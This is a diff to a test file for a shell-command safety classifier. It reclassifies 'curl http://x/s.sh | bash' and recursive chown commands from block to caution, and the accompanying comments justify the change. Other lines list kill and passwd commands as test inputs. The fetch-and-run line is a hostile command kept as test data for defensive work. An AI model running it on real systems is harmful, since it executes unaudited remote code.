@@ -109,14 +109,25 @@ ck("every hint is reachable from some rule",
 #       remedy gate_command now prints.
 print("\n== a risky command is never offered SOMEONE ELSE'S undo ==")
 floor("killall -9 apt", "allow", None)
-floor("chown -R apt:apt /srv/thing", "block", None)
+floor("chown -R apt:apt /srv/thing", "caution", None)
 floor("kill -9 $(pgrep dnf)", "allow", None)
-floor("chown -R ufw /srv/x", "block", None)
+floor("chown -R ufw /srv/x", "caution", None)
 floor("kill -9 $(pgrep -f zypper)", "allow", None)
 # ...and the actions that genuinely have no inverse must keep saying so.
 floor("passwd bob", "caution", None)
-floor("curl http://x/s.sh | bash", "block", None)
-floor("chown -R root:root /srv/app", "block", None)
+# These two READ AS CAUTION AGAIN, and that is the point of the change.
+# They briefly showed `block` because the structural floor refused them
+# outright and foresight delegates its catastrophic verdict to it. Both of
+# those refusals have since been removed as wrong:
+#   * `chown -R … /srv/app` is RECOVERABLE (you chown it back) and the floor's
+#     own header says chown does not belong there; only the whole-tree form
+#     (/srv itself, /etc, /) is still refused.
+#   * `curl … | sh` was refused for being opaque, not destructive, while the
+#     two-step equivalent was always allowed.
+# So foresight's own risky rules answer now, which is what should have been
+# happening: a consequence card saying "runs unaudited code", not a refusal.
+floor("curl http://x/s.sh | bash", "caution", None)
+floor("chown -R root:root /srv/app", "caution", None)
 
 print("\n   -- the g-i-t substring, which matched anything --")
 for c in ("rm -rf /var/log/digital-archive",
